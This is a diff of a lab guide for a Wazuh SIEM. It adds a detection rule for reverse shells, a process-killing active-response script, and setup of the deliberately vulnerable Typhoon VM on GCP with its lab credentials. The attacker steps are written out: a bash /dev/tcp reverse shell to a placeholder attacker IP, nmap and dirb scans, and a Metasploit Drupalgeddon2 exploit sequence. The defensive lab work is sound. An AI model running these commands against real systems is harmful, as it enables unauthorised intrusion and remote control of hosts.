@@ -752,11 +752,14 @@ Don't forget to put ```<localfile>``` block to ```nano /var/ossec/etc/ossec.conf
 </localfile>
 ```
 
-
 Restart the agent:
 ```sudo systemctl restart wazuh-agent```
 
 Control the audit logs from dashboard: Wazuh Explore -> Discover, Add Filter -> ```location: /var/log/audit/audit.log```
+
+```sudo tail -f /var/log/audit/audit.log```
+```sudo passwd testuser```
+
 
 **Reverse Shell and Active Response:**
 
@@ -771,11 +774,175 @@ On Victim, It opens a reverse shell by making Bash connect to your listener and 
 bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
 ```
 
+Chain rule and groups:
 
-Chain rule and groups
+```nano /var/ossec/etc/rules/local_rules.xml```
+
 ```xml
+<!-- Modify it at your will. local_rules.xml-->
 
+<group name="commands">
+    <rule id="100001" level="0">
+        <location>command_ps-list</location>
+        <description>List of running process.</description>
+        <group>process_monitor</group>
+    </rule>
+    
+    <rule id="100002" level="10">
+        <if_sid>100001</if_sid>
+        <if_group>process_monitor</if_group>
+        <match>eval(hex2bin</match>
+        <description>Reverse Shell Detected.</description>
+        <group>process_monitor,attacks</group>
+    </rule>
+    
+     <!-- 
+     Rule to confirm successful process termination via active response.
+     This creates a Level 12 alert in the dashboard.
+    -->
+    <rule id="100003" level="12">
+      <match>AR_CONFIRMATION: SCRIPT=close-port.sh</match>
+     <regex>STATUS=success PID=(\d+)</regex>
+     <description>Active Response: Malicious process was successfully terminated by close-port.sh.</description>
+     <group>active_response,remediation,</group>
+    </rule>
+</group>
 ```
 
-```sudo tail -f /var/log/audit/audit.log```
-```sudo passwd testuser```
+agent.conf of default group:
+```xml
+  <agent_config>
+    <!-- Shared agent configuration here -->
+    <wodle name="command">
+      <disabled>no</disabled>
+      <tag>ps-list</tag>
+      <command>ps -eo user,pid,cmd</command>
+      <interval>10s</interval>
+      <ignore_output>no</ignore_output>
+      <run_on_start>yes</run_on_start>
+      <timeout>5</timeout>
+    </wodle>
+  </agent_config>
+```
+
+**Typhoon Setup:**
+
+Link for Typhoon VM OVA: https://www.vulnhub.com/entry/typhoon-102,267/
+
+
+Download Typoon and ```cd /Typhoon```
+
+```tar xvf Typhoon-v1.02.ova``` now we have : disk001.vmdk
+
+Go to "Bucket" in GCP, Create a bucket.
+- After creating bucket select your bucket and upload file, upload our vmdk file. (This process can take time to shown in Images)
+- After go to your Bucket details -> Permissions -> Grant access -> Add principals ```service-1081593264932@gcp-sa-vmmigration.iam.gserviceaccount.com```
+- Save
+
+Go to "Images Compute Engine" not "Machine images" in GCP, Create image.
+- Source is Virtual disk(VMDK, VHD)
+- Go to new image import
+- name: typhoon-image
+- Source Cloud Storage file -> select our bucket and vmdk.
+
+Go to "VM instances"
+- Create instance -> OS and Storage -> Under the Operating system and storage Change -> Custom Images -> Select typhoon-image
+
+After creating typhoon machine, click dropdown right after the SSH button, select "View gcloud command" -> "Run in cloud shell". Use this command : 
+```
+gcloud compute ssh typhoon@typhoon-vc \
+    --project ecstatic-bounty-464116-d2 \
+    --zone southamerica-west1-b
+```
+
+Enter password only:
+
+- Username: typhoon
+- password: 789456123
+
+Access root:
+
+- su - admin
+- password: metallica
+
+- sudo /bin/bash
+- password: metallica
+
+
+on Typhoon:
+
+Check after exploit: ```ps -eo user,pid,cmd | grep www-data```
+
+```echo -e "wazuh_command.remote_commands=1" >> /var/ossec/etc/local_internal_options.conf```
+```service wazuh-agent restart```
+
+
+Configure Attacker, Kali Linux setup check: https://github.com/sefatuter/acme-siem/blob/main/kali_setup_gcp.md
+
+on Attacker:
+
+```bash
+nmap -sV <TYPHOON_IP>
+dirb http://<TYPHOON_IP>
+```
+
+```bash
+msfconsole
+use exploit/unix/webapp/drupal_drupalgeddon2
+show options
+set rhosts <TYPHOON_IP>
+set targeturi drupal/
+show options
+exploit
+shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+- Download Agent on Typhoon and Apply to Typhoon also script.
+
+on server/typhoon and manager close-port.sh: ```nano /var/ossec/active-response/bin/close-port.sh```
+
+```sh
+#!/usr/bin/env bash
+
+# It logs actions locally and sends a unique message back to create a confirmation alert.
+
+LOG_FILE="/var/ossec/logs/active-responses.log"
+
+read -r JSON
+
+echo "$(date): AR script started. Received JSON: ${JSON}" >> ${LOG_FILE}
+
+PID=$(echo "$JSON" | grep -oP '"full_log":"[^"]*\s+\K[0-9]+(?=\s+.*eval\(hex2bin)')
+
+if [[ -z "$PID" ]]; then
+  echo "$(date): Could not find a matching PID for a process containing 'eval(hex2bin)'. Exiting." >> ${LOG_FILE}
+  exit 0
+fi
+
+echo "$(date): Found PID ${PID} for process containing 'eval(hex2bin)'." >> ${LOG_FILE}
+
+echo "$(date): Sending SIGTERM (15) to PID ${PID}..." >> ${LOG_FILE}
+kill -15 "$PID" 2>/dev/null
+sleep 1
+
+if kill -0 "$PID" 2>/dev/null; then
+  echo "$(date): Process still exists. Sending SIGKILL (9) to PID ${PID}." >> ${LOG_FILE}
+  kill -9 "$PID" 2>/dev/null
+  MSG="Action complete. Forcefully killed PID ${PID}."
+else
+  MSG="Action complete. Process with PID ${PID} terminated gracefully."
+fi
+
+echo "$(date): ${MSG}" >> ${LOG_FILE}
+
+echo "Wazuh AR: Success - Process PID ${PID} terminated by close-port.sh."
+echo "AR_CONFIRMATION: SCRIPT=close-port.sh STATUS=success PID=${PID}" >> ${LOG_FILE}
+
+exit 0
+```
+
+```service wazuh-agent restart```
+
+
+```systemctl restart wazuh-manager```
